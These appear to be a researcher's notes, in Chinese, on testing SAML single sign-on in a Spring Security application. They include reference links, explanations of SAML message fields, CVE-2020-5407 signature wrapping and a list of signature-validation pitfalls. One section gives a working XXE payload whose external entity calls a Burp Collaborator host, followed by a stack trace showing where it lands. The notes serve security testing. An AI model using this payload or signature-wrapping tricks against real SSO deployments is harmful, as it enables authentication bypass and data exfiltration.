- https://infosecwriteups.com/lets-have-a-saml-talks-402559b34d4e
- https://research.nccgroup.com/2021/03/29/saml-xml-injection/
- https://research.aurainfosec.io/bypassing-saml20-SSO/
- https://jordanpotti.com/2019/08/26/phishing-with-saml-and-sso-providers/
- https://www.economyofmechanism.com/github-saml
- http://blog.intothesymmetry.com/2017/10/slack-saml-authentication-bypass.html
- https://www.nds.ruhr-uni-bochum.de/media/nds/veroeffentlichungen/2012/08/22/BreakingSAML_3.pdf
- https://www.reddit.com/r/netsec/comments/129n13/on_breaking_saml_be_whoever_you_want_to_be_pdf/
- https://www.hackedu.com/blog/analysis-of-common-federated-identity-protocols-openid-connect-vs-oauth-2.0-vs-saml-2.0
- [SAML Raider操作方法](https://blog.compass-security.com/2015/07/saml-burp-extension/)
- [How to Hunt Bugs in SAML; a Methodology - Part I](https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/)


### SAML相关知识背景
metadata，是一个XML文档，包含了SAML-enabled的DP和SP的必要信息。包含，比如说：URLs of endpoints, information about supported bindings, identifiers and public keys.

通常是给你自己的SP生成的，然后提供给所有其他的你想要进行SSO的DP。
可以通过这个Spring Security配置来启用：
```
<security:custom-filter before="FIRST" ref="metadataGeneratorFilter"/>
```
当Spring Security处理第一个URL请求时，这个filter就会被调用。


- [Metadata configuration](https://docs.spring.io/spring-security-saml/docs/current/reference/html/configuration-metadata.html)



### 名词概念
XML Signature Wrapping (XSW)

### SAML XXE
在原始samlresponse的基础上插入
使用XXE的payload：
```
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "wllmh29c901j8fuxg3y1bcoi2980wp.burpcollaborator.net"> %xxe; ]>
```
在这里，原封不动的到达：
org/springframework/security/saml2/provider/service/authentication/OpenSamlAuthenticationProvider#authenticate(Authentication authentication)
![image](https://user-images.githubusercontent.com/30398606/145777492-367f6330-c3b4-461e-90ef-c92a9cfcf63a.png)

```
authenticate:443, OpenSamlAuthenticationProvider (org.springframework.security.saml2.provider.service.authentication)
authenticate:68, Saml2AuthenticationManager (cn.com.xxxxxx.core.framework)
attemptAuthentication:103, Saml2WebSsoAuthenticationFilter (org.springframework.security.saml2.provider.service.servlet.filter)
doFilter:222, AbstractAuthenticationProcessingFilter (org.springframework.security.web.authentication)
doFilter:212, AbstractAuthenticationProcessingFilter (org.springframework.security.web.authentication)
doFilter:336, FilterChainProxy$VirtualFilterChain (org.springframework.security.web)
doFilterInternal:71, Saml2MetadataFilter (org.springframework.security.saml2.provider.service.web)
doFilter:119, OncePerRequestFilter (org.springframework.web.filter)
doFilter:336, FilterChainProxy$VirtualFilterChain (org.springframework.security.web)
doFilterInternal:157, Saml2WebSsoAuthenticationRequestFilter (org.springframework.security.saml2.provider.service.servlet.filter)
doFilter:119, OncePerRequestFilter (org.springframework.web.filter)
doFilter:336, FilterChainProxy$VirtualFilterChain (org.springframework.security.web)
doFilter:103, LogoutFilter (org.springframework.security.web.authentication.logout)
doFilter:89, LogoutFilter (org.springframework.security.web.authentication.logout)
doFilter:336, FilterChainProxy$VirtualFilterChain (org.springframework.security.web)
doFilterInternal:117, CsrfFilter (org.springframework.security.web.csrf)
doFilter:119, OncePerRequestFilter (org.springframework.web.filter)
doFilter:336, FilterChainProxy$VirtualFilterChain (org.springframework.security.web)
doHeadersAfter:90, HeaderWriterFilter (org.springframework.security.web.header)
doFilterInternal:75, HeaderWriterFilter (org.springframework.security.web.header)
doFilter:119, OncePerRequestFilter (org.springframework.web.filter)
doFilter:336, FilterChainProxy$VirtualFilterChain (org.springframework.security.web)
doFilter:110, SecurityContextPersistenceFilter (org.springframework.security.web.context)
doFilter:80, SecurityContextPersistenceFilter (org.springframework.security.web.context)
doFilter:336, FilterChainProxy$VirtualFilterChain (org.springframework.security.web)
doFilterInternal:55, WebAsyncManagerIntegrationFilter (org.springframework.security.web.context.request.async)
doFilter:119, OncePerRequestFilter (org.springframework.web.filter)
doFilter:336, FilterChainProxy$VirtualFilterChain (org.springframework.security.web)
doFilterInternal:211, FilterChainProxy (org.springframework.security.web)
doFilter:183, FilterChainProxy (org.springframework.security.web)
invokeDelegate:358, DelegatingFilterProxy (org.springframework.web.filter)
doFilter:271, DelegatingFilterProxy (org.springframework.web.filter)
internalDoFilter:190, ApplicationFilterChain (org.apache.catalina.core)
doFilter:163, ApplicationFilterChain (org.apache.catalina.core)
doFilterInternal:100, RequestContextFilter (org.springframework.web.filter)
doFilter:119, OncePerRequestFilter (org.springframework.web.filter)
internalDoFilter:190, ApplicationFilterChain (org.apache.catalina.core)
doFilter:163, ApplicationFilterChain (org.apache.catalina.core)
doFilterInternal:93, FormContentFilter (org.springframework.web.filter)
doFilter:119, OncePerRequestFilter (org.springframework.web.filter)
internalDoFilter:190, ApplicationFilterChain (org.apache.catalina.core)
doFilter:163, ApplicationFilterChain (org.apache.catalina.core)
doFilterInternal:142, SessionRepositoryFilter (org.springframework.session.web.http)
doFilter:82, OncePerRequestFilter (org.springframework.session.web.http)
internalDoFilter:190, ApplicationFilterChain (org.apache.catalina.core)
doFilter:163, ApplicationFilterChain (org.apache.catalina.core)
doFilterInternal:96, WebMvcMetricsFilter (org.springframework.boot.actuate.metrics.web.servlet)
doFilter:119, OncePerRequestFilter (org.springframework.web.filter)
internalDoFilter:190, ApplicationFilterChain (org.apache.catalina.core)
doFilter:163, ApplicationFilterChain (org.apache.catalina.core)
doFilterInternal:201, CharacterEncodingFilter (org.springframework.web.filter)
doFilter:119, OncePerRequestFilter (org.springframework.web.filter)
internalDoFilter:190, ApplicationFilterChain (org.apache.catalina.core)
doFilter:163, ApplicationFilterChain (org.apache.catalina.core)
invoke:202, StandardWrapperValve (org.apache.catalina.core)
invoke:97, StandardContextValve (org.apache.catalina.core)
invoke:542, AuthenticatorBase (org.apache.catalina.authenticator)
invoke:143, StandardHostValve (org.apache.catalina.core)
invoke:92, ErrorReportValve (org.apache.catalina.valves)
invoke:78, StandardEngineValve (org.apache.catalina.core)
service:357, CoyoteAdapter (org.apache.catalina.connector)
service:382, Http11Processor (org.apache.coyote.http11)
process:65, AbstractProcessorLight (org.apache.coyote)
process:893, AbstractProtocol$ConnectionHandler (org.apache.coyote)
doRun:1723, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
run:49, SocketProcessorBase (org.apache.tomcat.util.net)
runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
run:748, Thread (java.lang)
```

但是：


搜snyk搜到一个CVE-2020-5407，
> Spring Security versions 5.2.x prior to 5.2.4 and 5.3.x prior to 5.3.2 contain a signature wrapping vulnerability during SAML response validation. When using the `spring-security-saml2-service-provider` component, a malicious user can carefully modify an otherwise valid SAML response and append an arbitrary assertion that Spring Security will accept as valid.


https://security.snyk.io/search?type=any&q=spring-security-saml2
但是这个影响范围是：
```
[5.3.0.RELEASE,5.3.2.RELEASE) [5.2.0.RELEASE,5.2.4.RELEASE)
```
查看项目的直接和间接依赖：
```
mvn dependency:tree -Dincludes=org.springframework.security:spring-security-saml2-service-provider
```


### SAML消息解释
Ref：
- [进宫 SAML 2.0 安全](https://paper.seebug.org/2006/)
- https://research.aurainfosec.io/bypassing-saml20-SSO/


```

    AssertionConsumerServiceURL: 指定IDP认证成功之后，要将AuthnResponse发送到SP的哪个URL处理
    Destination: 指定IDP认证的端点
    ForceAuthn: 强制认证，就算之前认证过，浏览器携带了认证的session，如果这个值为true，还是会重新认证
    ID: 随机标识，主要是用来方便在其他标签引用，例如在SignedInfo中的Reference
    IsPassive: 默认为 false 。如果为 true，则IdP不能显示的通过浏览器与用户进行交互，用户不能感知到跳转的存在
    IssueInstant: 请求的签发时间
    ProtocolBinding: 使用什么来传输SAML消息，这里是通过HTTP POST来传输
    Version: 2.0版本

```


对于签名问题，在Bypassing SAML 2.0 SSO with XML Signature Attacks这篇文章中提到的几个问题感觉很好的说明了SAML可能存在的安全隐患:
```
    签名是否是必须的？可能一些SAML的实现从请求中判断是否携带了Signature，携带了就校验，没携带就不校验；或者设置一个签名校验开关让开发者进行处理，而开发者可能并不熟悉没有打开强制验证等情况
    签名是否经过验证？虽然生成AuthnRequest和Response都进行了签名，但是各自收到SAML消息时没有进行签名验证的情况
    签名是否来自正确的签名者？X509Certificate包含签名者信息，如果没有校验是否是信任的证书，那么可以伪造证书，然后对SAML消息进行篡改，重新签名
    是否对响应中正确的部分进行签名？SAML标准允许的签名存在的位置仅有两处:Response、Assertion，没有人仅仅为了使用SAML，就完整地实现复杂的XML签名机制。这一标准是通用的，标准的实现及其软件库也是如此。所以如果某些库如果验证签名没有验证到正确的位置，就可以将签名引用到文档的不同位置，并且让接受者认为签名是有效的，造成XSW攻击
```


参考：
- https://tanzu.vmware.com/security/cve-2020-5407
- https://security.snyk.io/vuln/SNYK-JAVA-ORGSPRINGFRAMEWORKSECURITY-569093
- https://blog.spoock.com/2018/10/23/java-xxe/
- https://github.com/spring-projects/spring-security/commit/69b1bc62ffe7c1e1bbf508951efa1e0235954198
- https://github.com/RUB-NDS/SAML-XXE-Test/blob/master/default_phase1_vectors.yml
